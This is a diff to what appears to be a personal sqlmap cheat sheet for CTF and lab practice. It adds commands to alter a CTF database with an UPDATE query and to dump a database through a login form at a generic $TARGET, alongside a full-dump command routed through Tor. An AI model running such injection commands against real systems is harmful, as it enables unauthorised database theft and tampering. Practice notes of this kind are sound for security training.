@@ -40,7 +40,6 @@ MySQL default databases
 ```sh
 sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --tables
 ```
-
 Result
 - tables names for <db-name>
 
@@ -54,7 +53,17 @@ Result
 - dump of <db-name>
 
 
+## Update database
+sqlmap -u https://b97b4ef2b348bba9ad205c30e5e971c4.ctf.hacker101.com/fetch?id=1 -D level5 --sql-query="UPDATE photos SET filename='files/purrfect.jpg' WHERE id=3;"
+
+
+## Login form
+sqlmap -u https://$TARGET/login --data "username=a&password=b" -p username --dump --output-dir="db-dump"
+
+
+
 ## -------------------------------------------------------------
 - sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --cookie="security=low; PHPSESSID=13o5hlkjs3hur2pvnfkgim9t74" --dump-all --batch --output-dir="db-dump" --random-agent --risk=3 --level=5 --tor
-- sqlmap -u .../login --data "username=a&password=b" -p username --dump --output-dir="db-dump"
+
+
 Upload File
